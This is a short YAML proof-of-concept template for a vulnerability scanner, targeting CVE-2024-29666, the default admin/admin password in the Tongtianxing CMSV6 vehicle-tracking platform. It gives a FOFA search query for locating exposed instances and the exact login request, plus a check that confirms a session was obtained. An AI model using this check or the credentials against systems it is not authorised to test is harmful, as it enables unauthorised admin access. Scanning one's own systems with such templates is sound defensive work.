id: poc-yaml-tongtianxing-cmsv6-admin-weak-password
info:
  name: 通天星CMSV6 admin 弱口令漏洞(CVE-2024-29666)
  severity: high
  tags:
  - CVE-2024-29666
  - 弱口令
  finger: cmsv6
  fofa: body="/808gps/"
requests:
- method: GET
  path: /StandardApiAction_login.action?account=admin&password=admin
  expression: "status_code == 200 && \nmatches(body,\"\\\"jsession\\\"\") &&\ncontains(body,\"\
    \\\"account_name\\\":\\\"admin\\\"\") &&\ncontains(content_type,\"application/json\"\
    )\n"
variables: {}
transport: http
